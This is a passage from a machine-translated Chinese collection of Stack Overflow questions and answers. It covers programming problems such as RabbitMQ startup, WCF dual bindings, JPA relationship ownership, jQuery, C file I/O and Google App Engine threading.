ps aux | grep rabbitmq 
```

使用终止 beam.smp 进程

```
kill -9 {process id} 
```

并再次启动rabbitmq-server。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-06-28T11:34:43.370

我的 brew 版本的 rabbitmq 也拒绝启动（在多年没有经过我修改的情况下工作良好）。

```
$ cat /usr/local/etc/rabbitmq/rabbitmq-env.conf
CONFIG_FILE=/usr/local/etc/rabbitmq/rabbitmq
NODE_IP_ADDRESS=127.0.0.1
NODENAME=rabbit@localhost
RABBITMQ_LOG_BASE=/usr/local/var/log/rabbitmq 
```

我编辑`rabbit@`并`NODENAME`重新`brew services restart rabbitmq`开始工作。

# wcf - Win7中的wsDualHttpBinding错误

> ID：10347752
> 
> 赞同：0
> 
> 时间：2012-04-27T08:59:08.823
> 
> 标签：wcf, wcf-binding, wcf-client, wsdualhttpbinding

我有一个服务器/客户端应用程序，其中服务器托管在 IIS 服务器中，许多客户端将连接到该 IIS 服务器，双重绑定用于将消息从服​​务器广播到客户端。

我在没有错误的 Vista 机器上开发，但是当我们在使用 Windows 7 的客户端 PC 上测试客户端应用程序时，出现错误。

**我第一次遇到这个错误：**

> HTTP 无法注册 URL [http://+:80/Temporary_Listen_Addresses/cc6f2e30-ff08-4bfc-8397-d67630337a9c/](http://+:80/Temporary_Listen_Addresses/cc6f2e30-ff08-4bfc-8397-d67630337a9c/) ，因为另一个应用程序正在使用 TCP 端口 80。主 UI 线程 1 上处理的异常。

根据来自互联网的解决方案，我在客户端配置文件中添加了一个 clientBaseAddress（没有更改，并且从不在服务器配置中添加 clientBaseAddress），现在我得到第二个错误：

> HTTP 无法注册 URL [http://+:91/NightlyBuild/NonVer/Communication/](http://+:91/NightlyBuild/NonVer/Communication/)。您的进程没有对此命名空间的访问权限（有关详细信息，请参阅 [http://go.microsoft.com/fwlink/?LinkId=70353](http://go.microsoft.com/fwlink/?LinkId=70353)）。主 UI 线程 1 上处理的异常。

好的，我发现一些评论说需要以管理员模式运行客户端应用程序，我也是这样做的，我没有收到前两个错误，但是这次我在屏幕冻结 5 分钟后出现超时错误。

**超时错误**

> 打开操作未在分配的 00:05:00 超时内完成。分配给此操作的时间可能是较长超时的一部分。主 UI 线程 1 上处理的异常。

下面是我遇到第二个错误时使用的客户端配置。

```
<wsDualHttpBinding>
        <binding name="WSDualHttpBinding_ICommunicationService"
                 closeTimeout="00:05:00" openTimeout="00:05:00" receiveTimeout="00:10:00" sendTimeout="00:05:00"
                 bypassProxyOnLocal="false" transactionFlow="false" hostNameComparisonMode="StrongWildcard"
                 maxBufferPoolSize="0" maxReceivedMessageSize="2147483647"
                 messageEncoding="Text" textEncoding="utf-8" useDefaultWebProxy="true" 
                 clientBaseAddress="http://remote-server:8001/Communication/">
          <readerQuotas maxDepth="2147483647" maxStringContentLength="2147483647" maxArrayLength="2147483647" maxBytesPerRead="2147483647" maxNameTableCharCount="2147483647" />
          <reliableSession ordered="true" inactivityTimeout="00:10:00" />
          <!--<security mode="Message">
            <message clientCredentialType="Windows" negotiateServiceCredential="true" algorithmSuite="Default" />
          </security>-->
          <security mode="None" />
        </binding> 
```

客户端配置中的端点：

```
<client>
      <endpoint address="http://remote-server:90/Communication/CommunicationService.svc" binding="wsDualHttpBinding" bindingConfiguration="WSDualHttpBinding_ICommunicationService" contract="CommunicationService.ICommunicationService" name="WSDualHttpBinding_ICommunicationService">
      </endpoint>
    </client> 
```

实在想不通，有意见吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-10-09T20:46:57.823

发生客户端“HTTP 无法注册...”错误是因为指定的 url 未注册到您运行该进程的用户。

为了临时解决这个问题，您可以使用 HTTPNamespaceManager.exe 程序来修改本地计算机上的 URL 访问保留列表。在这里获取：[PaulWh 的技术博客](http://blogs.msdn.com/b/paulwh/archive/2007/05/04/addressaccessdeniedexception-http-could-not-register-url-http-8080.aspx)

# emacs - 使用 utf8x 而不是 utf8 的 org-mode 导出

> ID：10347754
> 
> 赞同：3
> 
> 时间：2012-04-27T08:59:14.507
> 
> 标签：emacs

∧、∀ 和 ∃ 等所有花哨的字符在`utf8`inputenc 包中都没有代码点，但有`utf8x`。`utf8x`当我通过生成pdf时如何告诉emacs传递选项`org-export`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T12:31:11.563

例如，以下方式：

```
#+LATEX_HEADER: \usepackage[utf8x]{inputenc} 
```

您可以在[以下文件](https://raw.github.com/alexott/presentations/master/Emacs-ScalaByTalk.org)中找到更多示例...

# google-closure-library - goog.dom.createDom('input', 'class': 'xyz') 中的类属性在 chrome 中工作时在 firefox 中不起作用

> ID：10347762
> 
> 赞同：1
> 
> 时间：2012-04-27T09:00:00.657
> 
> 标签：google-closure-library

当我在我的 js 文件中使用 goog.dom.createDom('input', 'class': 'xyz') 时，应用到我的类的样式在 chrome 中工作时在 firefox 中运行时不会应用。这是代码：

```
var checkBox = goog.dom.createDom('input', {'type': 'checkbox'});
var checkBoxDiv = goog.dom.createDom('div', {'class': 'checkbox'}, checkBox); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-29T14:19:09.003

你的 CSS 一定是错误的。您的代码将为您提供以下内容，我相信您可以通过调试看到：

```
<div class="checkbox"><input type="checkbox"></div> 
```

# jpa - JPA 关系映射概念

> ID：10347766
> 
> 赞同：2
> 
> 时间：2012-04-27T09:00:25.517
> 
> 标签：jpa

我有几个关于双向映射的问题。

我有这些实体：

1.  员工(1) - (1) Parking_Lot
2.  员工(*) - (1) 部门
3.  员工(*) - (1) 项目

4.  上述关系的源实体和目标实体是什么？

5.  什么是`ManyToOne`关系的所有者。我想知道所有者是在多个实体还是一个实体上？
6.  是`mappedBy`在所有者方还是反方指定？

请帮忙。

编辑：

我有下表： **项目**- **Proj_Client** -**客户端**（多对多关系）并持久化项目表，但客户端没有持久化。它有什么问题？

谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-29T08:05:28.317

```
@Entity
@Table(name="empoyee")
public class Employee {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "id")
    private Integer id;
    @ManyToOne
    @JoinColumn(name="department_id", referencedColumnName="id")
    private Department department;
    @ManyToOne
    @JoinColumn(name="project_id", referencedColumnName="id")
    private Project projects;
    @OneToOne(mappedBy="employee")
    private ParkingLot parkingLot;
    //Other properties,constructors, getters and setters and so on
}

@Entity
@Table(name="department")
public class Department implements Serializable {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "id")
    private Long id;
    @OneToMany(mappedBy="department")
    private List<Employee> employees;
    //Other properties,constructors, getters and setters and so on}
@Entity
@Table(name="parking_lot")
public class ParkingLot implements Serializable {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "id")
    private Long id;
    @OneToOne
    @JoinColumn(name="employee_id",referencedColumnName="id")
    private Employee employee;
    //Other properties,constructors, getters and setters and so on}
@Entity
@Table(name="project")
public class Project implements Serializable {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "id")
    private Long id;
    @OneToMany(mappedBy="project")
    private List<Employee> employees;
    //Other properties,constructors, getters and setters and so on
} 
```

如果关系是单向的，则确实没有拥有方，也没有任何 mappedBy 注释。如果关系是双向的，则有一侧带有 mappedBy 注释 - 另一侧是拥有方。拥有方是拥有关系的一方。因此，该术语不能像 ParkingLot 拥有其 Employee 或 Employee 拥有其 ParkingLot 那样应用，而是像 ParkingLot 和 Employee 之间的关系由 Employee 拥有（或 ParkingLot 见下文）。对于 ManyToOne 没有 mappedBy，因此它始终是 OneToMany 注释下指定的实体拥有关系（这是有道理的，因为例如项目表不能有所有员工的外键）所以对于两个 ManyToOne/在您的示例中我们没有 OneToMany 映射 无法选择哪一方拥有这种关系。在Employee和ParkingLot之间我们有一个选择，我选择了ParkingLot。当有选择时，有什么关系？嗯，主要区别在于 mappedBy 具有属性级联。请注意，哪个表有外键，或者关系是否在它自己的表中都没有关系 - JPA 支持所有情况（@InverseJoinColumn 等）。

对于双向映射，映射没有明确的目标和来源，这取决于您从哪种方式进行映射。该术语更适用于单向映射，源端当然是具有映射的实体（即目标实体的可能知识）

4) 不适用（除非您将 ParkingLot 和 Employee 之间的关系设为单向）。5）关系的所有者总是“在一个实体上” 6）反面

最后说明：“拥有方”令人困惑，例如，我们可以设计一个部门拥有其员工，如果我们删除一个部门，其所有员工也将被删除。这将通过更改`@OneToMany(mappedBy="department")`为`@OneToMany(mappedBy="department", cascade= CascadeType.REMOVE)`then 来完成，说“Department 实体拥有其 Employee 实体”确实有意义，但该关系仍将由 Employee 实体拥有。

# jquery - Drupal jQuery 命名空间

> ID：10347767
> 
> 赞同：0
> 
> 时间：2012-04-27T09:00:26.163
> 
> 标签：jquery, namespaces, drupal-7

我可以使用简短方便的美元 jQuery 表示法我正在使用以下代码结构：

```
(function($) {
    $('div#webform-component-team-name').css('background', 'blue');
    alert('testing!');
    console.log('working...!');
})(jQuery); 
```

但是，除了我的 alert 和 console.log 语句之外，我发现没有任何效果。**这些语句工作正常，但改变背景颜色（或以$**开头的任何其他内容）的第二行却没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:44:50.343

我相信 alert 和 console.log 函数应该在没有 jQuery 的情况下工作（console.log 取决于您的浏览器）。所以我要检查的第一件事是 jQuery 实际上在您的页面中加载正常，并且在您运行此匿名函数之前可用。

[作为一个有用的旁白，这里](http://enterprisejquery.com/2010/10/how-good-c-habits-can-encourage-bad-javascript-habits-part-1/)有很好的解释使用自执行函数来命名空间 javascript/jQuery 。

它扩展了您使用的语法，如下例所示：

```
(function( skillet, $, undefined ) {
// do stuff here
}( window.skillet = window.skillet || {}, jQuery )); 
```

并展示如何将函数设为公开和私有。

# nosql - UNQL 数据存储

> ID：10347771
> 
> 赞同：0
> 
> 时间：2012-04-27T09:00:42.910
> 
> 标签：nosql, couchbase, unql

我已经在我的系统中安装了 UNQL 并尝试在 UNQL 客户端中运行以下查询

```
CREATE COLLECTION adc;

INSERT INTO adc 12345;

SELECT FROM adc; 
```

但我没有得到结果，谁能告诉我上述查询中出了什么问题。

问候维杰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-29T10:59:42.920

您应该先创建或打开数据库，但您忘记了 VALUE 术语：

```
> .new my.db
> CREATE COLLECTION adc;
> INSERT INTO adc VALUE 12345;
> SELECT FROM adc;
12345 
```

# javascript - 简单的for循环

> ID：10347772
> 
> 赞同：3
> 
> 时间：2012-04-27T09:00:43.083
> 
> 标签：javascript, for-loop

我有这个简单的 for 循环，但不幸的是我无法成功运行它。

这就是我所拥有的：

循环

```
 var imagesPerPage = 2

  for (i = 0; i < response.d.length; i++) {
    if (i > imagesPerPage) {
     alert('more');
     }else{
     alert('less');
     }
  } 
```

当我运行此代码时，`first`如果我有**<= 2**，那么我会得到`"less"`alert `twice`。但是当我有**> 2**时，我会得到`"less"`alert`twice`和`"more"`alert `once`。

谁能告诉我我哪里错了？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T09:03:07.190

为什么不`if`为此使用一个简单的构造？

```
var imagesPerPage = 2

if ( response.d.length > imagesPerPage ) {
  alert('more');
} else {
  alert('less');
} 
```

在您的代码中，循环总是运行`response.d.length`多次。在前两次中，您的 if 的错误部分会触发并导致两个“更多”警报。之后，所有其他运行都使用 if 子句的真实部分，并将返回“更多”。无论如何，无论您发出什么警报，所有运行都已完成。

`break`但是，您可以通过在要离开循环的点插入命令来停止循环。但是，这通常会导致代码非常不清楚，因此应尽可能避免。（此外，我怀疑这将是您想要的行为。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-27T09:03:59.820

为什么需要一个 for 循环？我认为这应该足够了：

```
 if ( response.d.length > imagesPerPage ) 
 {
   alert('more');
 }
 else
 {
   alert('less');
 } 
```

# c++ - 如果其他情况，Fputc 不起作用

> ID：10347778
> 
> 赞同：-2
> 
> 时间：2012-04-27T09:01:12.833
> 
> 标签：c++, c, file, file-io

我想更改文件的一个值，但下面的代码根本不起作用。当我删除 if 语句时它可以正常工作。
代码如下：

```
#include <stdio.h>

int main()
{
    int b;
    FILE *fp;

    fp=fopen("new", "r+");
    fseek(fp, 0x30, 0);

    b = fgetc(fp);
    if(b == 0x63)
        fputc(0x64, fp);

    fclose(fp);
    return 0;
} 
```

文件“新”：c111111111c111111111111111111111111111111111111c111111111111111111

是不是有一些我不知道的细节？</p>

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:04:53.413

如果是，您已经写了*过去* ，因为推进了文件流：`b``0x63``fgetc`

```
b = fgetc(fp);
if(b == 0x63) {
    fseek(fp, -1, SEEK_CUR);
    fputc(0x64, fp);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T15:45:01.890

我认为您的问题之一是 fp = fopen("new", "r+"); “r+”是读取和追加。如果您试图覆盖数据，那么这将不起作用。此外， fgetc 会如前所述推进文件流。

# javascript - Javascript 替换 Onblur

> ID：10347781
> 
> 赞同：1
> 
> 时间：2012-04-27T09:01:24.363
> 
> 标签：javascript, input, replace, getelementbyid, onblur

我想用“i,g,s”替换“ı,ğ,ş”。这是我的代码，但我找不到我的错。我必须用模糊事件来做。

```
<html>
<head>
<script type="text/javascript">
function replacer()
{
var x=document.getElementById("fname");
x.value=x.value.replace("ı","i");
x.value=x.value.replace("ş","s");
x.value=x.value.replace("ğ","g");
}
</script>
</head>
<body>
Name :<input type="text" id="fname" onblur="replacer()" />
</body>
</html> 
```

# jboss - JBoss：JaxB DataHandler 兼容性

> ID：10347782
> 
> 赞同：5
> 
> 时间：2012-04-27T09:01:29.193
> 
> 标签：jboss, jaxb, spring-ws

我正在使用 JBoss 5.1 (EAP)。我正在使用 Spring Web 服务（3.0.5）。对于编组，我使用的是 JaxB。

我正在使用 maven.jaxb2.plugin 从架构（xsd）生成 pojo。

当我在 JBoss 上部署 EAR 时，我收到以下错误：

```
    19:05:52,524 错误 [[eventmanager-ws]] 为 servlet eventmanager-ws 分配异常
    com.sun.xml.bind.v2.runtime.IllegalAnnotationsException：1 计数 IllegalAnnotationExceptions
    javax.activation.DataHandler 没有无参数默认构造函数。
            此问题与以下位置有关：
                    在 javax.activation.DataHandler
                    在受保护的 javax.activation.DataHandler
                    uk.co.aol.shipmanager.ws.schema.ReportResponse.data
                    在 uk.co.aol.shipmanager.ws.schema.ReportResponse
                    在公共 uk.co.aol.shipmanager.ws.schema.ReportResponse
                    uk.co.aol.shipmanager.ws.schema.ObjectFactory.createReportResponse()
                    在 uk.co.aol.shipmanager.ws.schema.ObjectFactory

            在 com.sun.xml.bind.v2.runtime.IllegalAnnotationsException$Builder.check(IllegalAnnotationsException.j>ava:102)
            在 com.sun.xml.bind.v2.runtime.JAXBContextImpl.getTypeInfoSet(JAXBContextImpl.java:472)
            在 com.sun.xml.bind.v2.runtime.JAXBContextImpl.(JAXBContextImpl.java:302)
            在 com.sun.xml.bind.v2.runtime.JAXBContextImpl$JAXBContextBuilder.build(JAXBContextImpl.java:1136)
            在 com.sun.xml.bind.v2.ContextFactory.createContext(ContextFactory.java:154)
            在 com.sun.xml.bind.v2.ContextFactory.createContext(ContextFactory.java:121)
            在 com.sun.xml.bind.v2.ContextFactory.createContext(ContextFactory.java:202)
            在 sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
            在 sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
            在 sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
            在 java.lang.reflect.Method.invoke(Method.java:597)
            在 javax.xml.bind.ContextFinder.newInstance(ContextFinder.java:128)
            在 javax.xml.bind.ContextFinder.find(ContextFinder.java:277)
            在 javax.xml.bind.JAXBContext.newInstance(JAXBContext.java:372)
            在 javax.xml.bind.JAXBContext.newInstance(JAXBContext.java:337)
            在 org.springframework.oxm.jaxb.Jaxb2Marshaller.createJaxbContextFromContextPath(Jaxb2Marshaller.java:>355)
            在 org.springframework.oxm.jaxb.Jaxb2Marshaller.getJaxbContext(Jaxb2Marshaller.java:328)
            在 org.springframework.oxm.jaxb.Jaxb2Marshaller.afterPropertiesSet(Jaxb2Marshaller.java:317)
            在 org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods（AbstractAutowireCapableBeanFactory.java:1477）
            在 org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1417)
            在 org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
            在 org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
            在 org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
            在 org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton（DefaultSingleto>BeanRegistry.java:222）

```

我检查了 jaxb2 插件版本并尝试使用以前的版本，假设 JBoss 获得了 JaxB 2.1.12，尝试了很多版本但没有运气。

有什么建议么？

谢谢，阿迪

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T20:00:09.163

在您的实体中的某个地方，您有 type 的字段`DataHandler`。`@javax.xml.bind.annotation.XmlTransient`用注释 标记此字段

```
class SomeEntity  
{  
    //...   
   @javax.xml.bind.annotation.XmlTransient  
   private javax.activation.DataHandler yourField;  
   // ...  
} 
```

# qt - 使用 Qt 上传到 Linux 上的 ftp 服务器失败！[目标位置的文件大小为零]

> ID：10347783
> 
> 赞同：0
> 
> 时间：2012-04-27T09:01:44.380
> 
> 标签：qt, ubuntu, file-upload, ftp, ftp-server

我正在尝试将文件上传到 FTP 服务器，这是由 vsftpd 创建的本地服务器。我在 vsftpd.conf 文件中设置了连接和传输文件所需的必要参数。我的要求是将文件上传到此服务器。当我记录 statechanged 消息时，我的 ftp 对象会发出 HostLookup、Connecting、Connected、Logged in、关闭和 Unconnected 消息。但是，当我检查目标目录时，文件在那里，但大小为 0...可能有什么问题？以下是我使用的代码...

```
QImage img("./Sample.jpg");
QBuffer* buf = new QBuffer();
buf->open(QBuffer::ReadWrite);
buf->seek(0);
img.save(buf, "jpg");
connection = new QFtp();
connection->connectToHost("localhost");
connection->login();
connection->cd("ftpshare/");
connection->put(buf, "Sample.jpg", QFtp::Binary);
qDebug(QString::number(connection->error()).toLatin1());
qDebug(connection->errorString().toLatin1());
connect(connection,SIGNAL(stateChanged(int)),this,SLOT(ftpstatechanged(int)));
connection->close(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:15:27.257

您确定第一行在`Sample.jpg`它正在查找的文件夹中找到了吗？也许工作目录不是你想象的那样。否则这应该工作得很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:03:29.397

问题在于缓冲区的使用。当我改用 QByteArray 时，它得到了解决。

```
QImage img("./Sample.png");
QByteArray ba;
QBuffer buffer(&ba);
buffer.open(QIODevice::WriteOnly);
img.save(&buffer, "PNG");
connection = new QFtp();
connection->connectToHost("localhost");
connection->login();
connection->cd("ftpshare/");
connection->put(ba, "Sample.png", QFtp::Binary); 
```

# iphone - 识别使用 UIBezierPath 绘制的不同形状？

> ID：10347784
> 
> 赞同：2
> 
> 时间：2012-04-27T09:01:49.210
> 
> 标签：iphone, objective-c, ios, xcode, ios4

我可以使用 UIBezierPath 对象绘制形状。现在我想识别使用它绘制的不同形状，例如。Rectangle 、 Square 、 Triangle 、 Circle 等。接下来我要做的是用户应该能够选择一个特定的形状，并且应该能够将整个形状移动到屏幕上的不同位置。实际要求更复杂，但如果我能做到这一点，那么我可以解决剩下的问题。

欢迎任何关于我如何开始的建议或链接或要点。我正在考虑编写一个单独的视图来处理每个形状，但不知道我该怎么做..

谢谢大家 ！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T13:10:31.990

我推荐 David Gelphman 的*Programming with Quartz*。

在他的“用路径绘图”一章中，他有一个关于“路径构造基元”的部分，它提供了一个十字路口：

如果您使用`CGContextAddLineToPoint`您的用户可以制作由已知笛卡尔点定义的直线。您将使用基本数学来推断由这些点定义的几何形状。

如果您使用`CGContextAddCurveToPoint`您的用户可以制作由已知点定义的*曲线*，并且我很确定这些线会*穿过*这些点，因此您仍然可以使用基本数学来确定至少形成的形状类型的近似值。

但如果你使用，这些点定义了绘制曲线*之外*`CGContextAddQuadCurveToPoint`的框架。您需要更高级的数学来确定由沿切线的曲线形成的形状。

 *Gelphman 还讨论了“路径效用函数”，例如获取边界框并检查给定点是否在路径内。

至于移动完成的路径，我想你会使用`CGContextTranslateCTM`.*

# asp.net - 使用 count() 按优先级排序的 T-Sql 排序结果

> ID：10347786
> 
> 赞同：0
> 
> 时间：2012-04-27T09:02:00.813
> 
> 标签：asp.net, sql, sql-server, tsql

我正在尝试构建一个具有线程和帖子的系统。我正在尝试获取最受欢迎的线程（用户可以单击“喜欢”按钮使其更受欢迎）并且帖子最多。问题是按大多数帖子排序结果..然后按喜欢的帖子排序。

例如，如果我有一个帖子有 300 个帖子和 200 个赞……而另一个帖子有 300 个赞和 201 个赞……我希望选择第二个帖子……

简而言之，表结构：

```
topic:
--------
topic_id
liked

comment:
-------
comment_id
topic_id 
```

到目前为止，这是我的存储过程：

```
 dbo.Trends

AS
    SELECT TOP 1 title, COUNT(com.topic_id), COUNT(topc.user_id_liked) 
FROM comment AS com
INNER JOIN topic AS topc ON com.topic_id=topc.topic_id
GROUP BY com.topic_id, topc.user_id_liked,title
ORDER BY COUNT(com.topic_id), COUNT(topc.user_id_liked) DESC 
```

我不确定我是否正确，或者我是否必须控制流逻辑。我将主题表中的 topic_id 放在 order 语句中的 topic like 列之前。希望 topic_id 的选择/排序优先。

**更新：查询已更新。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:13:28.127

我真的不知道你想要什么。但也许这会有所帮助：

```
;WITH CTE
AS
(
    SELECT
        COUNT(com.topic_id) OVER(PARTITION BY topc.liked) AS topicCount,
        COUNT(com.liked) OVER(PARTITION BY topc.topic_id) AS likedCount,
        title
    FROM 
        commnet AS com
        INNER JOIN topic AS topc 
            ON com.topic_id=topc.topic_id
)
SELECT TOP 1
    CTE.title,
    CTE.topicCount,
    CTE.likedCount
FROM
    CTE
ORDER BY
    topicCount,
    likedCount 
```

**编辑**

`GROUP BY`和之间的区别在于`PARTITION BY`它`PARTITION BY`是内联的`GROUP BY`，因此这不会影响行数。我喜欢在作为内联视图的 CTE 中使用它。使其更清晰，您可以将要执行的不同步骤分开。如果你删除`TOP 1`你会明白我的意思。

# silverlight - 编译后没有变化

> ID：10347793
> 
> 赞同：0
> 
> 时间：2012-04-27T09:02:22.300
> 
> 标签：silverlight, xap

当我编译我的 Silverlight 项目时，没有进行任何更改。当我创建一个新项目时，不会生成 xap 文件。既不在 clientbin 也不在 bin 调试/发布中。我清除了缓存...我尝试了不同的浏览器。没有任何效果

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-07T09:44:07.330

我想通了。在 vs2010 中的选项->项目和解决方案->构建和运行->运行时，当项目过期时，它被设置为从不构建。

我不知道那是怎么做到的，因为我从来没有改变过那里的任何东西。

# android - 不显示 ListView 中第一个 listItem 的上下文菜单

> ID：10347802
> 
> 赞同：0
> 
> 时间：2012-04-27T09:03:22.783
> 
> 标签：android, listview, contextmenu

我有一个列表视图，其中包含一些列表项。我已经使用`registerForContextMenu(mListView);`. 现在我想要的是，如果用户长按列表视图的第一项，则不应显示该项目的上下文菜单，但对于所有其余项目，如果用户长按，它应该弹出上下文菜单他们。我们可以这样做吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:10:04.527

相反，我建议您使用`OnItemLongClickListener`which 将返回长按项目的**位置值。**通过考虑该值，您可以决定显示带有选项列表的对话框或忽略它。

例如：

```
yourListView.setOnItemLongClickListener(new OnItemLongClickListener() {
    @Override
    public boolean onItemLongClick(AdapterView<?> parent, View view,
            int position, long id) {
        if(position != 0){  //ignoring first item from list
            //do whatever you want
        }
        return false;
    }
}); 
```

# java - 线程安全同步块

> ID：10347807
> 
> 赞同：1
> 
> 时间：2012-04-27T09:03:41.940
> 
> 标签：java, thread-safety

我对**线程同步**有些困惑。考虑我有两个线程**Thread1**和**Thread2**以及两个**同步的方法 foo1()**和**foo2()**。foo1() 是**同步**方法而 foo2() 不是，在 foo1 内部有一条语句调用 foo2() 并且如果 Thread1 调用 foo1() 并且它正在 foo2() 方法中工作，同时 Thread2 想要直接访问不同步的 foo2() 方法。

所以我的问题是 Thread2 会获得 Foo2() 的访问权限吗？或者它会等待 Thread1 完成它的任务？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T09:06:02.290

如果`foo2()`未同步，则任何线程都可以随时调用它而不会被阻塞。线程是否从另一个本身同步的方法调用它没有任何区别。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-27T09:10:58.973

锁定的是对象，而不是方法。这意味着如果它们正在访问不同的对象，您可以在 foo1() 中拥有两个线程。如果他们访问的是同一个对象，同一个锁会阻止并发访问，不管什么先调用或什么调用。

顺便说一句： foo1() 可以调用自己，因为它已经拥有锁。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-27T09:06:55.437

Thread2 不会被阻塞也不会等待。它将开始执行 Foo2，因为它没有同步。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T09:27:33.227

Thread2 可以直接调用 foo2()，因为 foo2() 不是同步方法，所以任何线程都可以调用它而不获取当前对象的监视器。</p>

# .net - 字符串数组行为：对于使用 VB.NET 的字符串数组中的每个操作

> ID：10347809
> 
> 赞同：0
> 
> 时间：2012-04-27T09:03:48.927
> 
> 标签：.net, vb.net, arrays, string, foreach

我想知道在其中使用**For Each**循环时字符串数组的行为。考虑以下代码：

```
Dim StringArray(499) As String
'fill in each element with random string

Dim count As Int32
Dim current As String

For Each current in StringArray
    'do something with current
    count = count + 1
    If count = 10
        Exit For
    End If
Next

're-enter the StringArray again
count = 0
For Each current in StringArray
    'do something with current
    count = count + 1
    If count = 10
        Exit For
    End If
Next 
```

如上面的代码所示，如​​果我需要使用**For Each 循环**访问 StringArray 两次，那么即使我在每个**For Each 循环中只使用 10 个元素，StringArray 中的****所有**元素是否也会被加载两次？从性能的角度来看，是否建议使用字符串数组作为数据结构来存储需要多次访问的字符串列表，例如在一个方法中访问 20 次？

 *** * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T09:06:41.540

“加载”是什么意思？您只是在遍历数组。这不会“加载”任何东西——它只是迭代它。如果您担心的是，它不会复制。

至少在 C# 中，`foreach`在编译时已知为数组的表达式上的循环将基本上保持（并增加）索引并使用直接数组访问。它甚至不会创建一个`IEnumerator(Of T)`. 我希望 VB 的行为方式相同。

请注意，LINQ 可以使您的示例代码更简单：

```
' No need to declare any variables outside the loop
For Each current As String in StringArray.Take(10)
    ' Do something with current
Next 
```

> 从性能的角度来看，是否建议使用字符串数组作为数据结构来存储需要多次访问的字符串列表，例如在一个方法中访问 20 次？

相对于什么？例如，这样做比每次都重新查询数据库要好。`List(Of String)`但是将 a 转换为字符串数组是不值得的......**

# javascript - jQuery、js、ajax、div元素高度错误

> ID：10347813
> 
> 赞同：1
> 
> 时间：2012-04-27T09:03:55.313
> 
> 标签：javascript, jquery, ajax, google-chrome, height

我有一个有趣的问题。我使用 jQuery（行列表）通过 ajax 加载一些数据，然后将它们放入 div 中，最终将其附加到文档中。当我尝试这样做时

```
doc.append(myDiv);
console.log(myDiv.height()); 
```

我得到错误的高度（文件检查器显示不同的值）。但是当我等待（例如 750 毫秒），然后尝试获取高度时，就可以了。

还有我的问题，我做错了什么，还是浏览器的正常行为？（我正在使用 Chrome）

干杯。

起来，为了澄清事情，我这样做：

```
success: function() {
       for(line in data){
            doing sth on line, and then append to myDiv
       }
       myDiv.height()
      } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:24:44.887

尝试在没有 jquery 的情况下使用直接 javascript 获取高度。我注意到有时 jquery 的高度和宽度函数不正确。试试这些：

```
myDiv.get(0).offsetHeight; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:07:41.743

这可能是因为未加载 ajax 响应。尝试将 ajax 与`async:false`. 检查这个[http://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:07:45.307

您应该等待数据加载到 DIV 中，然后只执行警报。我不确定您的完整代码是什么，但看起来这就是问题所在

# java - 谷歌 appengine 是单线程的吗？（java）

> ID：10347817
> 
> 赞同：0
> 
> 时间：2012-04-27T09:04:10.810
> 
> 标签：java, google-app-engine

我的问题是“Google appengine 是单线程的吗？现在当我问我知道我不能通过在 java 中使用线程来启动我自己的线程时。但是我们可以使用后端启动线程。

我关心如何处理请求的请求线程。我读到有人在appengine中每个请求都排队，然后一个一个地服务。我可以配置一个请求可以排队的最长时间。如果服务器请求的时间超过最大时间然后创建新实例。

那么如果我想使用单实例（免费配额）怎么办。

如果我收到多个请求，如 r1 、 r2 、r3、r4 （按此顺序）。那么每个请求是否会一个接一个地提供服务（在单个实例的情况下）？

如果我在负载增加并且动态创建新实例时创建多个实例，那么实例一的主内存中存在的数据是否也会被克隆到实例中？

2个实例中的数据会一直同步吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T11:11:12.650

同意尼克所说的，但也想指出这句话：“现在当我问我知道我不能通过在 java 中使用线程来启动我自己的线程时”

